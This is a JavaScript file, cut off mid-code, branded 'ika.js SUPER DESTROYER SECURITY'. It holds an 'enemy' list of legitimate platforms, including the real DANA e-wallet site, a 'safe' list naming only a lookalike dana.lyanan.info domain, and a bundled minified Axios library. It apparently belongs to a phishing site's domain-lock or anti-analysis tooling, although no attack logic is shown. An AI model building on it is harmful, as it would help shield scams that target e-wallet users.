/*
* ika.js 2.0 - SUPER DESTROYER SECURITY
* Enhanced with Global Domain Destroyer & Real-time IP Tracking
* Integrated with Axios for Advanced Security
* Copyright (c) 2024
* Licensed under the MIT license.
*/

(function (name, context, definition) {
  'use strict'
  if (typeof window.define === 'function' && window.define.amd) { window.define(definition) } else if (typeof module !== 'undefined' && module.exports) { module.exports = definition() } else if (context.exports) { context.exports = definition() } else { context[name] = definition() }
})('ika', this, function () {
  'use strict'
  const DOMAIN_MUSUH = [
    'netlify.app',
    'https://www.netlify.com/', 
    'www.netlify.com', 
    'www.dana.id', 
    'www.ucoz.com', 
    'glitch.com', 
    'www.google.com', 
    'github.com', 
    'vercel.app', 
    'github.io',
    'herokuapp.com',
    'pages.dev',
    'web.app',
    'firebaseapp.com',
    'railway.app',
    'render.com',
    'supabase.co',
    'onrender.com',
    'fly.dev',
    'aws.amazon.com',
    'azure.com',
    'cloudflare.com',
    'glitch.me',
    'repl.co',
    'now.sh',
    'vercel.sh',
    'githubusercontent.com',
    'gist.github.com',
    's3.amazonaws.com',
    'amazonaws.com',
    'storage.googleapis.com',
    'appspot.com',
    'cloudfunctions.net',
    'surge.sh',
    '000webhostapp.com',
    'infinityfreeapp.com',
    'ngrok.io',
    'serveo.net',
    'localtunnel.me',
    'stackblitz.io',
    'codesandbox.io',
    'bit.ly',
    'tinyurl.com',
    'is.gd',
    't.co',
    'shorturl.at',
    'goo.gl',
    'fastly.net',
    'akamaiedge.net',
    'edgekey.net',
    'cdn-akamai.net',
    'cdn.cloudflare.net',
    'cdn.jsdelivr.net',
    'jsdelivr.net',
    'stackpathcdn.com',
    'objectstorage.us-ashburn-1.oraclecloud.com',
    'fbx.co',
    'pmcdn.co',
    'short.cm',
    'shorte.st',
    'su.pr',
    'owl.ly',
    'clk.im',
    'clk.sh',
    '1url.com',
    'vb.ly',
    'linktr.ee',
    'bit.do',
    'cur.lv',
    'v.gd',
    'short.io',
    'cutt.ly',
    'urlr.me',
    'trklnks.com',
    'shortest.link',
    'rebrand.ly',
    'lnkd.in',
    'my.id',
    'co.id',
    'web.id',
    '.tk',
    '.ml',
    '.ga',
    '.cf',
    '.gq',
    '.xyz',
    '.top',
    '.online',
    '.site',
    '.vip',
    '.shop',
    '.info',
    '.club',
    '.win',
    '.icu',
    '.loan',
    '.bid',
    '.men',
    '.pw',
    '.work',
    '.rest',
    '.press',
    '.click',
    '.link',
    '.download',
    '.live',
    '.space',
    '.party',
    '.pro',
    '.cfd',
    '.xin',
    '.sbs',
    '.store',
    '.tech',
    'app-serve.net',
    'herokussl.com',
    'herokussl.xyz',
    'zip-download.xyz',
    'secure-login.online',
    'verify-account.top',
    'account-update.xyz',
    'payment-info.site',
    'banking-secure.online',
    'reset-password.xyz',
    'pay.amazon.com',
    'login.microsoftonline.com',
    'accounts.google.com',
    'secure-paypal.com',
    'paypal-community.com',
    's3.eu-central-1.amazonaws.com',
    's3.ap-southeast-1.amazonaws.com',
    'storage.cloud.google.com',
    'cdn-storage.com',
    'codeshare.io',
    'pastebin.com',
    'paste.rs',
    'pastebin.ca',
    'ghost.io',
    'bitbucket.io',
    'bitbucket.org',
    'gitlab.io',
    'gitlab.com',
    'uploads.im',
    'imgur.com',
    'imageshack.us',
    'imgbb.com',
    'freeimage.host',
    'mailchimp.com',
    'sendgrid.net',
    'mailgun.org',
    'postmarkapp.com',
    'proxy.site',
    'proxysite.com',
    'animedoujinshi.xyz',
    'free-downloads.icu',
    'update-software.online',
    'installer-setup.xyz',
    'xn--domainexample-abc.com',
    'login-secure-verify.site',
    'confirm-user.online',
    'user-verify.xyz',
    'verification.my.id',
    'scan.my.id',
    'secure.my.id',
    'scam123.my.id',
    'phishingsite.my.id',
    'shorturl.my.id',
    'freegift.my.id',
    'promo.my.id',
    'voucher.my.id',
    'claim.my.id',
    'example.xyz',
    'login.xyz',
    'secure.xyz',
    'auth.xyz',
    'accounts.xyz',
    'mail.xyz',
    'attachments.xyz',
    'docs.xyz',
    'storage.xyz',
    'files.xyz'
  ];
  const DOMAIN_AMAN = [
    "dana.lyanan.info", 
    "www.dana.lyanan.info",
    "lyanan.info",
    "www.lyanan.info",
  ];
  var axios = (function(){"use strict";function e(t){return e="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e(t)}function t(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function n(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}function r(e,t,r){return t&&n(e.prototype,t),r&&n(e,r),Object.defineProperty(e,"prototype",{writable:!1}),e}function o(e,t){return function(){return e.apply(t,arguments)}}var i,s=Object.prototype.toString,a=Object.getPrototypeOf,u=(i=Object.create(null),function(e){var t=s.call(e);return i[t]||(i[t]=t.slice(8,-1).toLowerCase())}),c=function(e){return e=e.toLowerCase(),function(t){return u(t)===e}},f=function(t){return function(n){return e(n)===t}},l=Array.isArray,d=f("undefined");var h=c("ArrayBuffer");var p=f("string"),m=f("function"),v=f("number"),y=function(t){return null!==t&&"object"===e(t)},b=function(e){if("object"!==u(e))return!1;var t=a(e);return!(null!==t&&t!==Object.prototype&&null!==Object.getPrototypeOf(t)||Symbol.toStringTag in e||Symbol.iterator in e)},g=c("Date"),E=c("File"),w=c("Blob"),O=c("FileList"),R=c("URLSearchParams");function S(t,n){var r,o,i=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},s=i.allOwnKeys,a=void 0!==s&&s;if(null!=t)if("object"!==e(t)&&(t=[t]),l(t))for(r=0,o=t.length;r<o;r++)n.call(null,t[r],r,t);else{var u,c=a?Object.getOwnPropertyNames(t):Object.keys(t),f=c.length;for(r=0;r<f;r++)u=c[r],n.call(null,t[u],u,t)}}var A,j=(A="undefined"!=typeof Uint8Array&&a(Uint8Array),function(e){return A&&e instanceof A}),T=c("HTMLFormElement"),x=function(e){var t=Object.prototype.hasOwnProperty;return function(e,n){return t.call(e,n)}}(),C=c("RegExp"),N=function(e,t){var n=Object.getOwnPropertyDescriptors(e),r={};S(n,(function(n,o){!1!==t(n,o,e)&&(r[o]=n)})),Object.defineProperties(e,r)},P={isArray:l,isArrayBuffer:h,isBuffer:function(e){return null!==e&&!d(e)&&null!==e.constructor&&!d(e.constructor)&&m(e.constructor.isBuffer)&&e.constructor.isBuffer(e)},isFormData:function(e){var t="[object FormData]";return e&&("function"==typeof FormData&&e instanceof FormData||s.call(e)===t||m(e.toString)&&e.toString()===t)},isArrayBufferView:function(e){return"undefined"!=typeof ArrayBuffer&&ArrayBuffer.isView?ArrayBuffer.isView(e):e&&e.buffer&&h(e.buffer)},isString:p,isNumber:v,isBoolean:function(e){return!0===e||!1===e},isObject:y,isPlainObject:b,isUndefined:d,isDate:g,isFile:E,isBlob:w,isRegExp:C,isFunction:m,isStream:function(e){return y(e)&&m(e.pipe)},isURLSearchParams:R,isTypedArray:j,isFileList:O,forEach:S,merge:function e(){for(var t={},n=function(n,r){b(t[r])&&b(n)?t[r]=e(t[r],n):b(n)?t[r]=e({},n):l(n)?t[r]=n.slice():t[r]=n},r=0,o=arguments.length;r<o;r++)arguments[r]&&S(arguments[r],n);return t},extend:function(e,t,n){var r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{},i=r.allOwnKeys;return S(t,(function(t,r){n&&m(t)?e[r]=o(t,n):e[r]=t}),{allOwnKeys:i}),e},trim:function(e){return e.trim?e.trim():e.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"")},stripBOM:function(e){return 65279===e.charCodeAt(0)&&(e=e.slice(1)),e},inherits:function(e,t,n,r){e.prototype=Object.create(t.prototype,r),e.prototype.constructor=e,Object.defineProperty(e,"super",{value:t.prototype}),n&&Object.assign(e.prototype,n)},toFlatObject:function(e,t,n,r){var o,i,s,u={};if(t=t||{},null==e)return t;do{for(i=(o=Object.getOwnPropertyNames(e)).length;i-- >0;)s=o[i],r&&!r(s,e,t)||u[s]||(t[s]=e[s],u[s]=!0);e=!1!==n&&a(e)}while(e&&(!n||n(e,t))&&e!==Object.prototype);return t},kindOf:u,kindOfTest:c,endsWith:function(e,t,n){e=String(e),(void 0===n||n>e.length)&&(n=e.length),n-=t.length;var r=e.indexOf(t,n);return-1!==r&&r===n},toArray:function(e){if(!e)return null;if(l(e))return e;var t=e.length;if(!v(t))return null;for(var n=new Array(t);t-- >0;)n[t]=e[t];return n},forEachEntry:function(e,t){for(var n,r=(e&&e[Symbol.iterator]).call(e);(n=r.next())&&!n.done;){var o=n.value;t.call(e,o[0],o[1])}},matchAll:function(e,t){for(var n,r=[];null!==(n=e.exec(t));)r.push(n);return r},isHTMLForm:T,hasOwnProperty:x,hasOwnProp:x,reduceDescriptors:N,freezeMethods:function(e){N(e,(function(t,n){var r=e[n];m(r)&&(t.enumerable=!1,"writable"in t?t.writable=!1:t.set||(t.set=function(){throw Error("Can not read-only method '"+n+"'")}))}))},toObjectSet:function(e,t){var n={},r=function(e){e.forEach((function(e){n[e]=!0}))};return l(e)?r(e):r(String(e).split(t)),n},toCamelCase:function(e){return e.toLowerCase().replace(/[_-\s]([a-z\d])(\w*)/g,(function(e,t,n){return t.toUpperCase()+n}))},noop:function(){},toFiniteNumber:function(e,t){return e=+e,Number.isFinite(e)?e:t}};function _(e,t,n,r,o){Error.call(this),Error.captureStackTrace?Error.captureStackTrace(this,this.constructor):this.stack=(new Error).stack,this.message=e,this.name="AxiosError",t&&(this.code=t),n&&(this.config=n),r&&(this.request=r),o&&(this.response=o)}P.inherits(_,Error,{toJSON:function(){return{message:this.message,name:this.name,description:this.description,number:this.number,fileName:this.fileName,lineNumber:this.lineNumber,columnNumber:this.columnNumber,stack:this.stack,config:this.config,code:this.code,status:this.response&&this.response.status?this.response.status:null}}});var B=_.prototype,D={};["ERR_BAD_OPTION_VALUE","ERR_BAD_OPTION","ECONNABORTED","ETIMEDOUT","ERR_NETWORK","ERR_FR_TOO_MANY_REDIRECTS","ERR_DEPRECATED","ERR_BAD_RESPONSE","ERR_BAD_REQUEST","ERR_CANCELED","ERR_NOT_SUPPORT","ERR_INVALID_URL"].forEach((function(e){D[e]={value:e}})),Object.defineProperties(_,D),Object.defineProperty(B,"isAxiosError",{value:!0}),_.from=function(e,t,n,r,o,i){var s=Object.create(B);return P.toFlatObject(e,s,(function(e){return e!==Error.prototype}),(function(e){return"isAxiosError"!==e})),_.call(s,e.message,t,n,r,o),s.cause=e,s.name=e.name,i&&Object.assign(s,i),s};var F="object"==("undefined"==typeof self?"undefined":e(self))?self.FormData:window.FormData;function U(e){return P.isPlainObject(e)||P.isArray(e)}function k(e){return P.endsWith(e,"[]")?e.slice(0,-2):e}function L(e,t,n){return e?e.concat(t).map((function(e,t){return e=k(e),!n&&t?"["+e+"]":e})).join(n?".":""):t}var q=P.toFlatObject(P,{},null,(function(e){return/^is[A-Z]/.test(e)}));function z(t,n,r){if(!P.isObject(t))throw new TypeError("target must be an object");n=n||new(F||FormData);var o,i=(r=P.toFlatObject(r,{metaTokens:!0,dots:!1,indexes:!1},!1,(function(e,t){return!P.isUndefined(t[e])}))).metaTokens,s=r.visitor||l,a=r.dots,u=r.indexes,c=(r.Blob||"undefined"!=typeof Blob&&Blob)&&((o=n)&&P.isFunction(o.append)&&"FormData"===o[Symbol.toStringTag]&&o[Symbol.iterator]);if(!P.isFunction(s))throw new TypeError("visitor must be a function");function f(e){if(null===e)return"";if(P.isDate(e))return e.toISOString();if(!c&&P.isBlob(e))throw new _("Blob is not supported. Use a Buffer instead.");return P.isArrayBuffer(e)||P.isTypedArray(e)?c&&"function"==typeof Blob?new Blob([e]):Buffer.from(e):e}function l(t,r,o){var s=t;if(t&&!o&&"object"===e(t))if(P.endsWith(r,"{}"))r=i?r:r.slice(0,-2),t=JSON.stringify(t);else if(P.isArray(t)&&function(e){return P.isArray(e)&&!e.some(U)}(t)||P.isFileList(t)||P.endsWith(r,"[]")&&(s=P.toArray(t)))return r=k(r),s.forEach((function(e,t){!P.isUndefined(e)&&n.append(!0===u?L([r],t,a):null===u?r:r+"[]",f(e))})),!1;return!!U(t)||(n.append(L(o,r,a),f(t)),!1)}var d=[],h=Object.assign(q,{defaultVisitor:l,convertValue:f,isVisitable:U});if(!P.isObject(t))throw new TypeError("data must be an object");return function e(t,r){if(!P.isUndefined(t)){if(-1!==d.indexOf(t))throw Error("Circular reference detected in "+r.join("."));d.push(t),P.forEach(t,(function(t,o){!0===(!P.isUndefined(t)&&s.call(n,t,P.isString(o)?o.trim():o,r,h))&&e(t,r?r.concat(o):[o])})),d.pop()}}(t),n}function I(e){var t={"!":"%21","'":"%27","(":"%28",")":"%29","~":"%7E","%20":"+","%00":"\0"};return encodeURIComponent(e).replace(/[!'()~]|%20|%00/g,(function(e){return t[e]}))}function M(e,t){this._pairs=[],e&&z(e,this,t)}var J=M.prototype;function H(e){return encodeURIComponent(e).replace(/%3A/gi,":").replace(/%24/g,"$").replace(/%2C/gi,",").replace(/%20/g,"+").replace(/%5B/gi,"[").replace(/%5D/gi,"]")}function V(e,t,n){if(!t)return e;var r=e.indexOf("#");-1!==r&&(e=e.slice(0,r));var o=n&&n.encode||H,i=P.isURLSearchParams(t)?t.toString():new M(t,n).toString(o);return i&&(e+=(-1===e.indexOf("?")?"?":"&")+i),e}J.append=function(e,t){this._pairs.push([e,t])},J.toString=function(e){var t=e?function(t){return e.call(this,t,I)}:I;return this._pairs.map((function(e){return t(e[0])+"="+t(e[1])}),"").join("&")};var W,K=function(){function e(){t(this,e),this.handlers=[]}return r(e,[{key:"use",value:function(e,t,n){return this.handlers.push({fulfilled:e,rejected:t,synchronous:!!n&&n.synchronous,runWhen:n?n.runWhen:null}),this.handlers.length-1}},{key:"eject",value:function(e){this.handlers[e]&&(this.handlers[e]=null)}},{key:"clear",value:function(){this.handlers&&(this.handlers=[])}},{key:"forEach",value:function(e){P.forEach(this.handlers,(function(t){null!==t&&e(t)}))}}]),e}(),X={silentJSONParsing:!0,forcedJSONParsing:!0,clarifyTimeoutError:!1},$="undefined"!=typeof URLSearchParams?URLSearchParams:M,Q=FormData,G=("undefined"==typeof navigator||"ReactNative"!==(W=navigator.product)&&"NativeScript"!==W&&"NS"!==W)&&"undefined"!=typeof window&&"undefined"!=typeof document,Y={isBrowser:!0,classes:{URLSearchParams:$,FormData:Q,Blob:Blob},isStandardBrowserEnv:G,protocols:["http","https","file","blob","url","data"]};function Z(e){function t(e,n,r,o){var i=e[o++],s=Number.isFinite(+i),a=o>=e.length;return i=!i&&P.isArray(r)?r.length:i,a?(P.hasOwnProp(r,i)?r[i]=[r[i],n]:r[i]=n,!s):(r[i]&&P.isObject(r[i])||(r[i]=[]),t(e,n,r[i],o)&&P.isArray(r[i])&&(r[i]=function(e){var t,n,r={},o=Object.keys(e),i=o.length;for(t=0;t<i;t++)r[n=o[t]]=e[n];return r}(r[i])),!s)}if(P.isFormData(e)&&P.isFunction(e.entries)){var n={};return P.forEachEntry(e,(function(e,r){t(function(e){return P.matchAll(/\w+|\[(\w*)]/g,e).map((function(e){return"[]"===e[0]?"":e[1]||e[0]}))}(e),r,n,0)})),n}return null}var ee=Y.isStandardBrowserEnv?{write:function(e,t,n,r,o,i){var s=[];s.push(e+"="+encodeURIComponent(t)),P.isNumber(n)&&s.push("expires="+new Date(n).toGMTString()),P.isString(r)&&s.push("path="+r),P.isString(o)&&s.push("domain="+o),!0===i&&s.push("secure"),document.cookie=s.join("; ")},read:function(e){var t=document.cookie.match(new RegExp("(^|;\\s*)("+e+")=([^;]*)"));return t?decodeURIComponent(t[3]):null},remove:function(e){this.write(e,"",Date.now()-864e5)}}:{write:function(){},read:function(){return null},remove:function(){}};function te(e,t){return e&&!/^([a-z][a-z\d+\-.]*:)?\/\//i.test(t)?function(e,t){return t?e.replace(/\/+$/,"")+"/"+t.replace(/^\/+/,""):e}(e,t):t}var ne=Y.isStandardBrowserEnv?function(){var e,t=/(msie|trident)/i.test(navigator.userAgent),n=document.createElement("a");function r(e){var r=e;return t&&(n.setAttribute("href",r),r=n.href),n.setAttribute("href",r),{href:n.href,protocol:n.protocol?n.protocol.replace(/:$/,""):"",host:n.host,search:n.search?n.search.replace(/^\?/,""):"",hash:n.hash?n.hash.replace(/^#/,""):"",hostname:n.hostname,port:n.port,pathname:"/"===n.pathname.charAt(0)?n.pathname:"/"+n.pathname}}return e=r(window.location.href),function(t){var n=P.isString(t)?r(t):t;return n.protocol===e.protocol&&n.host===e.host}}():function(){return!0};function re(e,t,n){_.call(this,null==e?"canceled":e,_.ERR_CANCELED,t,n),this.name="CanceledError"}P.inherits(re,_,{__CANCEL__:!0});var oe=P.toObjectSet(["age","authorization","content-length","content-type","etag","expires","from","host","if-modified-since","if-unmodified-since","last-modified","location","max-forwards","proxy-authorization","referer","retry-after","user-agent"]),ie=Symbol("internals"),se=Symbol("defaults");function ae(e){return e&&String(e).trim().toLowerCase()}function ue(e){return!1===e||null==e?e:String(e)}function ce(e,t,n,r){return P.isFunction(r)?r.call(this,t,n):P.isString(t)?P.isString(r)?-1!==t.indexOf(r):P.isRegExp(r)?r.test(t):void 0:void 0}function fe(e,t){t=t.toLowerCase();for(var n,r=Object.keys(e),o=r.length;o-- >0;)if(t===(n=r[o]).toLowerCase())return n;return null}function le(e,t){e&&this.set(e),this[se]=t||null}function de(e,t){var n=0,r=function(e,t){e=e||10;var n,r=new Array(e),o=new Array(e),i=0,s=0;return t=void 0!==t?t:1e3,function(a){var u=Date.now(),c=o[s];n||(n=u),r[i]=a,o[i]=u;for(var f=s,l=0;f!==i;)l+=r[f++],f%=e;if((i=(i+1)%e)===s&&(s=(s+1)%e),!(u-n<t)){var d=c&&u-c;return d?Math.round(1e3*l/d):void 0}}}(50,250);return function(o){var i=o.loaded,s=o.lengthComputable?o.total:void 0,a=i-n,u=r(a);n=i;var c={loaded:i,total:s,progress:s?i/s:void 0,bytes:a,rate:u||void 0,estimated:u&&s&&i<=s?(s-i)/u:void 0};c[t?"download":"upload"]=!0,e(c)}}function he(e){return new Promise((function(t,n){var r,o=e.data,i=le.from(e.headers).normalize(),s=e.responseType;function a(){e.cancelToken&&e.cancelToken.unsubscribe(r),e.signal&&e.signal.removeEventListener("abort",r)}P.isFormData(o)&&Y.isStandardBrowserEnv&&i.setContentType(!1);var u=new XMLHttpRequest;if(e.auth){var c=e.auth.username||"",f=e.auth.password?unescape(encodeURIComponent(e.auth.password)):"";i.set("Authorization","Basic "+btoa(c+":"+f))}var l=te(e.baseURL,e.url);function d(){if(u){var r=le.from("getAllResponseHeaders"in u&&u.getAllResponseHeaders());!function(e,t,n){var r=n.config.validateStatus;n.status&&r&&!r(n.status)?t(new _("Request failed with status code "+n.status,[_.ERR_BAD_REQUEST,_.ERR_BAD_RESPONSE][Math.floor(n.status/100)-4],n.config,n.request,n)):e(n)}((function(e){t(e),a()}),(function(e){n(e),a()}),{data:s&&"text"!==s&&"json"!==s?u.response:u.responseText,status:u.status,statusText:u.statusText,headers:r,config:e,request:u}),u=null}}if(u.open(e.method.toUpperCase(),V(l,e.params,e.paramsSerializer),!0),u.timeout=e.timeout,"onloadend"in u?u.onloadend=d:u.onreadystatechange=function(){u&&4===u.readyState&&(0!==u.status||u.responseURL&&0===u.responseURL.indexOf("file:"))&&setTimeout(d)},u.onabort=function(){u&&(n(new _("Request aborted",_.ECONNABORTED,e,u)),u=null)},u.onerror=function(){n(new _("Network Error",_.ERR_NETWORK,e,u)),u=null},u.ontimeout=function(){var t=e.timeout?"timeout of "+e.timeout+"ms exceeded":"timeout exceeded",r=e.transitional||X;e.timeoutErrorMessage&&(t=e.timeoutErrorMessage),n(new _(t,r.clarifyTimeoutError?_.ETIMEDOUT:_.ECONNABORTED,e,u)),u=null},Y.isStandardBrowserEnv){var h=(e.withCredentials||ne(l))&&e.xsrfCookieName&&ee.read(e.xsrfCookieName);h&&i.set(e.xsrfHeaderName,h)}void 0===o&&i.setContentType(null),"setRequestHeader"in u&&P.forEach(i.toJSON(),(function(e,t){u.setRequestHeader(t,e)})),P.isUndefined(e.withCredentials)||(u.withCredentials=!!e.withCredentials),s&&"json"!==s&&(u.responseType=e.responseType),"function"==typeof e.onDownloadProgress&&u.addEventListener("progress",de(e.onDownloadProgress,!0)),"function"==typeof e.onUploadProgress&&u.upload&&u.upload.addEventListener("progress",de(e.onUploadProgress)),(e.cancelToken||e.signal)&&(r=function(t){u&&(n(!t||t.type?new re(null,e,u):t),u.abort(),u=null)},e.cancelToken&&e.cancelToken.subscribe(r),e.signal&&(e.signal.aborted?r():e.signal.addEventListener("abort",r)));var p,m=(p=/^([-+\w]{1,25})(:?\/\/|:)/.exec(l))&&p[1]||"";m&&-1===Y.protocols.indexOf(m)?n(new _("Unsupported protocol "+m+":",_.ERR_BAD_REQUEST,e)):u.send(o||null)}))}Object.assign(le.prototype,{set:function(e,t,n){var r=this;function o(e,t,n){var o=ae(t);if(!o)throw new Error("header name must be a non-empty string");var i=fe(r,o);(!i||!0===n||!1!==r[i]&&!1!==n)&&(e=P.isArray(e)?e.map(ue):ue(e),r[i||t]=e)}return P.isPlainObject(e)?P.forEach(e,(function(e,n){o(e,n,t)})):o(t,e,n),this},get:function(e,t){if(e=ae(e)){var n=fe(this,e);if(n){var r=this[n];if(!t)return r;if(!0===t)return function(e){for(var t,n=Object.create(null),r=/([^\s,;=]+)\s*(?:=\s*([^,;]+))?/g;t=r.exec(e);)n[t[1]]=t[2];return n}(r);if(P.isFunction(t))return t.call(this,r,n);if(P.isRegExp(t))return t.exec(r);throw new TypeError("parser must be boolean|regexp|function")}}},has:function(e,t){if(e=ae(e)){var n=fe(this,e);return!(!n||t&&!ce(0,this[n],n,t))}return!1},delete:function(e,t){var n=this,r=!1;function o(e){if(e=ae(e)){var o=fe(n,e);!o||t&&!ce(0,n[o],o,t)||(delete n[o],r=!0)}}return P.isArray(e)?e.forEach(o):o(e),r},clear:function(){return Object.keys(this).forEach(this.delete.bind(this))},normalize:function(e){var t=this,n={};return P.forEach(this,(function(r,o){var i=fe(n,o);if(i)return t[i]=ue(r),void delete t[o];var s=e?function(e){return e.trim().toLowerCase().replace(/([a-z\d])(\w*)/g,(function(e,t,n){return t.toUpperCase()+n}))}(o):String(o).trim();s!==o&&delete t[o],t[s]=ue(r),n[s]=!0})),this},toJSON:function(){var e=Object.create(null);return P.forEach(Object.assign({},this[se]||null,this),(function(t,n){null!=t&&!1!==t&&(e[n]=P.isArray(t)?t.join(", "):t)})),e}}),Object.assign(le,{from:function(e){return P.isString(e)?new this((i={},(t=e)&&t.split("\n").forEach((function(e){o=e.indexOf(":"),n=e.substring(0,o).trim().toLowerCase(),r=e.substring(o+1).trim(),!n||i[n]&&oe[n]||("set-cookie"===n?i[n]?i[n].push(r):i[n]=[r]:i[n]=i[n]?i[n]+", "+r:r)})),i)):e instanceof this?e:new this(e);var t,n,r,o,i},accessor:function(e){var t=(this[ie]=this[ie]={accessors:{}}).accessors,n=this.prototype;function r(e){var r=ae(e);t[r]||(!function(e,t){var n=P.toCamelCase(" "+t);["get","set","has"].forEach((function(r){Object.defineProperty(e,r+n,{value:function(e,n,o){return this[r].call(this,t,e,n,o)},configurable:!0})}))}(n,e),t[r]=!0)}return P.isArray(e)?e.forEach(r):r(e),this}}),le.accessor(["Content-Type","Content-Length","Accept","Accept-Encoding","User-Agent"]),P.freezeMethods(le.prototype),P.freezeMethods(le);var pe={http:he,xhr:he},me=function(e){if(P.isString(e)){var t=pe[e];if(!e)throw Error(P.hasOwnProp(e)?"Adapter '".concat(e,"' is not available in the build"):"Can not resolve adapter '".concat(e,"'"));return t}if(!P.isFunction(e))throw new TypeError("adapter is not a function");return e},ve={"Content-Type":"application/x-www-form-urlencoded"};var ye,be={transitional:X,adapter:("undefined"!=typeof XMLHttpRequest?ye=me("xhr"):"undefined"!=typeof process&&"process"===P.kindOf(process)&&(ye=me("http")),ye),transformRequest:[function(e,t){var n,r=t.getContentType()||"",o=r.indexOf("application/json")>-1,i=P.isObject(e);if(i&&P.isHTMLForm(e)&&(e=new FormData(e)),P.isFormData(e))return o&&o?JSON.stringify(Z(e)):e;if(P.isArrayBuffer(e)||P.isBuffer(e)||P.isStream(e)||P.isFile(e)||P.isBlob(e))return e;if(P.isArrayBufferView(e))return e.buffer;if(P.isURLSearchParams(e))return t.setContentType("application/x-www-form-urlencoded;charset=utf-8",!1),e.toString();if(i){if(r.indexOf("application/x-www-form-urlencoded")>-1)return function(e,t){return z(e,new Y.classes.URLSearchParams,Object.assign({visitor:function(e,t,n,r){return Y.isNode&&P.isBuffer(e)?(this.append(t,e.toString("base64")),!1):r.defaultVisitor.apply(this,arguments)}},t))}(e,this.formSerializer).toString();if((n=P.isFileList(e))||r.indexOf("multipart/form-data")>-1){var s=this.env&&this.env.FormData;return z(n?{"files[]":e}:e,s&&new s,this.formSerializer)}}return i||o?(t.setContentType("application/json",!1),function(e,t,n){if(P.isString(e))try{return(t||JSON.parse)(e),P.trim(e)}catch(e){if("SyntaxError"!==e.name)throw e}return(n||JSON.stringify)(e)}(e)):e}],transformResponse:[function(e){var t=this.transitional||be.transitional,n=t&&t.forcedJSONParsing,r="json"===this.responseType;if(e&&P.isString(e)&&(n&&!this.responseType||r)){var o=!(t&&t.silentJSONParsing)&&r;try{return JSON.parse(e)}catch(e){if(o){if("SyntaxError"===e.name)throw _.from(e,_.ERR_BAD_RESPONSE,this,null,this.response);throw e}}}return e}],timeout:0,xsrfCookieName:"XSRF-TOKEN",xsrfHeaderName:"X-XSRF-TOKEN",maxContentLength:-1,maxBodyLength:-1,env:{FormData:Y.classes.FormData,Blob:Y.classes.Blob},validateStatus:function(e){return e>=200&&e<300},headers:{common:{Accept:"application/json, text/plain, */*"}}};function ge(e,t){var n=this||be,r=t||n,o=le.from(r.headers),i=r.data;return P.forEach(e,(function(e){i=e.call(n,i,o.normalize(),t?t.status:void 0)})),o.normalize(),i}function Ee(e){return!(!e||!e.__CANCEL__)}function we(e){if(e.cancelToken&&e.cancelToken.throwIfRequested(),e.signal&&e.signal.aborted)throw new re}function Oe(e){return we(e),e.headers=le.from(e.headers),e.data=ge.call(e,e.transformRequest),(e.adapter||be.adapter)(e).then((function(t){return we(e),t.data=ge.call(e,e.transformResponse,t),t.headers=le.from(t.headers),t}),(function(t){return Ee(t)||(we(e),t&&t.response&&(t.response.data=ge.call(e,e.transformResponse,t.response),t.response.headers=le.from(t.response.headers))),Promise.reject(t)}))}function Re(e,t){t=t||{};var n={};function r(e,t){return P.isPlainObject(e)&&P.isPlainObject(t)?P.merge(e,t):P.isPlainObject(t)?P.merge({},t):P.isArray(t)?t.slice():t}function o(n){return P.isUndefined(t[n])?P.isUndefined(e[n])?void 0:r(void 0,e[n]):r(e[n],t[n])}function i(e){if(!P.isUndefined(t[e]))return r(void 0,t[e])}function s(n){return P.isUndefined(t[n])?P.isUndefined(e[n])?void 0:r(void 0,e[n]):r(void 0,t[n])}function a(n){return n in t?r(e[n],t[n]):n in e?r(void 0,e[n]):void 0}var u={url:i,method:i,data:i,baseURL:s,transformRequest:s,transformResponse:s,paramsSerializer:s,timeout:s,timeoutMessage:s,withCredentials:s,adapter:s,responseType:s,xsrfCookieName:s,xsrfHeaderName:s,onUploadProgress:s,onDownloadProgress:s,decompress:s,maxContentLength:s,maxBodyLength:s,beforeRedirect:s,transport:s,httpAgent:s,httpsAgent:s,cancelToken:s,socketPath:s,responseEncoding:s,validateStatus:a};return P.forEach(Object.keys(e).concat(Object.keys(t)),(function(e){var t=u[e]||o,r=t(e);P.isUndefined(r)&&t!==a||(n[e]=r)})),n}P.forEach(["delete","get","head"],(function(e){be.headers[e]={}})),P.forEach(["post","put","patch"],(function(e){be.headers[e]=P.merge(ve)}));var Se="1.1.2",Ae={};["object","boolean","number","function","string","symbol"].forEach((function(t,n){Ae[t]=function(r){return e(r)===t||"a"+(n<1?"n ":" ")+t}}));var je={};Ae.transitional=function(e,t,n){function r(e,t){return"[Axios v1.1.2] Transitional option '"+e+"'"+t+(n?". "+n:"")}return function(n,o,i){if(!1===e)throw new _(r(o," has been removed"+(t?" in "+t:"")),_.ERR_DEPRECATED);return t&&!je[o]&&(je[o]=!0,console.warn(r(o," has been deprecated since v"+t+" and will be removed in the near future"))),!e||e(n,o,i)}};var Te={assertOptions:function(t,n,r){if("object"!==e(t))throw new _("options must be an object",_.ERR_BAD_OPTION_VALUE);for(var o=Object.keys(t),i=o.length;i-- >0;){var s=o[i],a=n[s];if(a){var u=t[s],c=void 0===u||a(u,s,t);if(!0!==c)throw new _("option "+s+" must be "+c,_.ERR_BAD_OPTION_VALUE)}else if(!0!==r)throw new _("Unknown option "+s,_.ERR_BAD_OPTION)}},validators:Ae},xe=Te.validators,Ce=function(){function e(n){t(this,e),this.defaults=n,this.interceptors={request:new K,response:new K}}return r(e,[{key:"request",value:function(e,t){"string"==typeof e?(t=t||{}).url=e:t=e||{};var n=(t=Re(this.defaults,t)).transitional;void 0!==n&&Te.assertOptions(n,{silentJSONParsing:xe.transitional(xe.boolean),forcedJSONParsing:xe.transitional(xe.boolean),clarifyTimeoutError:xe.transitional(xe.boolean)},!1),t.method=(t.method||this.defaults.method||"get").toLowerCase();var r=t.headers&&P.merge(t.headers.common,t.headers[t.method]);r&&P.forEach(["delete","get","head","post","put","patch","common"],(function(e){delete t.headers[e]})),t.headers=new le(t.headers,r);var o=[],i=!0;this.interceptors.request.forEach((function(e){"function"==typeof e.runWhen&&!1===e.runWhen(t)||(i=i&&e.synchronous,o.unshift(e.fulfilled,e.rejected))}));var 